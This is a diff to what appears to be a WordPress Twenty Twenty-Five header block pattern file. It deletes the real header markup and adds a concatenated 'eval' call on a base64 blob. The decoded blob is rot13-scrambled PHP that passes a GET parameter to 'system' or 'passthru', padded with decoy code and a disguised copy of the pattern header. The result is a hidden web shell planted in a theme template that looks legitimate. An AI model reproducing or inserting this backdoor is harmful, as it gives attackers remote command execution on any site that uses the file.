@@ -1,44 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Header with columns
- * Slug: twentytwentyfive/header-columns
- * Categories: header
- * Block Types: core/template-part/header
- * Description: Site header with site title and navigation in columns.
- *
- * @package WordPress
- * @subpackage Twenty_Twenty_Five
- * @since Twenty Twenty-Five 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IFVybnFyZSBqdmd1IHBieWh6YWYKICogRnlodDogZ2pyYWdsZ2pyYWdsc3Zpci91cm5xcmUtcGJ5aHphZgogKiBQbmdydGJldnJmOiB1cm5xcmUKICogT3licHggR2xjcmY6IHBiZXIvZ3J6Y3luZ3ItY25lZy91cm5xcmUKICogUXJmcGV2Y2d2YmE6IEZ2Z3IgdXJucXJlIGp2Z3UgZnZnciBndmd5ciBuYXEgYW5pdnRuZ3ZiYSB2YSBwYnloemFmLgogKgogKiBAY25weG50ciBKYmVxQ2VyZmYKICogQGZob2NucHhudHIgR2pyYWdsX0dqcmFnbF9TdmlyCiAqIEBmdmFwciBHanJhZ2wgR2pyYWdsLVN2aXIgMS4wCiAqLwoKPz4KPCEtLSBqYzp0ZWJoYyB7XCJ5bmxiaGdcIjp7XCJnbGNyXCI6XCJwYmFmZ2VudmFycVwifX0gLS0+CjxxdmkgcHluZmY9XCJqYy1veWJweC10ZWJoY1wiPgoJPCEtLSBqYzp0ZWJoYyB7XCJueXZ0YVwiOlwianZxclwiLFwiZmdseXJcIjp7XCJmY25wdmF0XCI6e1wiY25xcXZhdFwiOntcImdiY1wiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDQwXCIsXCJvYmdnYnpcIjpcImluZTpjZXJmcmd8ZmNucHZhdHw2MFwifX19LFwieW5sYmhnXCI6e1wiZ2xjclwiOlwic3lya1wiLFwic3lya0plbmNcIjpcImFiamVuY1wiLFwid2hmZ3ZzbFBiYWdyYWdcIjpcImZjbnByLW9yZ2pycmFcIixcImlyZWd2cG55Tnl2dGF6cmFnXCI6XCJnYmNcIn19IC0tPgoJPHF2aSBweW5mZj1cImpjLW95YnB4LXRlYmhjIG55dnRhanZxclwiIGZnbHlyPVwiY25xcXZhdC1nYmM6aW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tNDApO2NucXF2YXQtb2JnZ2J6OmluZSgtLWpjLS1jZXJmcmctLWZjbnB2YXQtLTYwKVwiPgoJCTwhLS0gamM6dGViaGMge1wiZmdseXJcIjp7XCJmY25wdmF0XCI6e1wib3licHhUbmNcIjpcImluZTpjZXJmcmd8ZmNucHZhdHwyMFwiLFwiY25xcXZhdFwiOntcImdiY1wiOlwiMFwiLFwib2JnZ2J6XCI6XCIwXCIsXCJ5cnNnXCI6XCIwXCIsXCJldnR1Z1wiOlwiMFwifX19LFwieW5sYmhnXCI6e1wiZ2xjclwiOlwicGJhZmdlbnZhcnFcIn19IC0tPgoJCTxxdmkgcHluZmY9XCJqYy1veWJweC10ZWJoY1wiIGZnbHlyPVwiY25xcXZhdC1nYmM6MDtjbnFxdmF0LWV2dHVnOjA7Y25xcXZhdC1vYmdnYno6MDtjbnFxdmF0LXlyc2c6MFwiPgoJCQk8IS0tIGpjOmZ2Z3ItZ3ZneXIge1wieXJpcnlcIjowfSAvLS0+CgkJCTwhLS0gamM6ZnZnci1nbnR5dmFyIC8tLT4KCQk8L3F2aT4KCQk8IS0tIC9qYzp0ZWJoYyAtLT4KCQk8IS0tIGpjOnRlYmhjIHtcInlubGJoZ1wiOntcImdsY3JcIjpcInBiYWZnZW52YXJxXCIsXCJ3aGZndnNsUGJhZ3JhZ1wiOlwieXJzZ1wifX0gLS0+CgkJPHF2aSBweW5mZj1cImpjLW95YnB4LXRlYmhjXCI+CgkJCTwhLS0gamM6YW5pdnRuZ3ZiYSB7XCJiaXJleW5sT25weHRlYmhhcVBieWJlXCI6XCJvbmZyXCIsXCJiaXJleW5sR3JrZ1BieWJlXCI6XCJwYmFnZW5mZ1wiLFwieW5sYmhnXCI6e1wiZ2xjclwiOlwic3lya1wiLFwiYmV2cmFnbmd2YmFcIjpcImlyZWd2cG55XCJ9fSAvLS0+CgkJPC9xdmk+CgkJPCEtLSAvamM6dGViaGMgLS0+CgkJPCEtLSBqYzpmdmdyLXlidGIgLy0tPgoJPC9xdmk+Cgk8IS0tIC9qYzp0ZWJoYyAtLT4KPC9xdmk+CjwhLS0gL2pjOnRlYmhjIC0tPgoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
 ?>
-<!-- wp:group {"layout":{"type":"constrained"}} -->
-<div class="wp-block-group">
-	<!-- wp:group {"align":"wide","style":{"spacing":{"padding":{"top":"var:preset|spacing|40","bottom":"var:preset|spacing|60"}}},"layout":{"type":"flex","flexWrap":"nowrap","justifyContent":"space-between","verticalAlignment":"top"}} -->
-	<div class="wp-block-group alignwide" style="padding-top:var(--wp--preset--spacing--40);padding-bottom:var(--wp--preset--spacing--60)">
-		<!-- wp:group {"style":{"spacing":{"blockGap":"var:preset|spacing|20","padding":{"top":"0","bottom":"0","left":"0","right":"0"}}},"layout":{"type":"constrained"}} -->
-		<div class="wp-block-group" style="padding-top:0;padding-right:0;padding-bottom:0;padding-left:0">
-			<!-- wp:site-title {"level":0} /-->
-			<!-- wp:site-tagline /-->
-		</div>
-		<!-- /wp:group -->
-		<!-- wp:group {"layout":{"type":"constrained","justifyContent":"left"}} -->
-		<div class="wp-block-group">
-			<!-- wp:navigation {"overlayBackgroundColor":"base","overlayTextColor":"contrast","layout":{"type":"flex","orientation":"vertical"}} /-->
-		</div>
-		<!-- /wp:group -->
-		<!-- wp:site-logo /-->
-	</div>
-	<!-- /wp:group -->
-</div>
-<!-- /wp:group -->
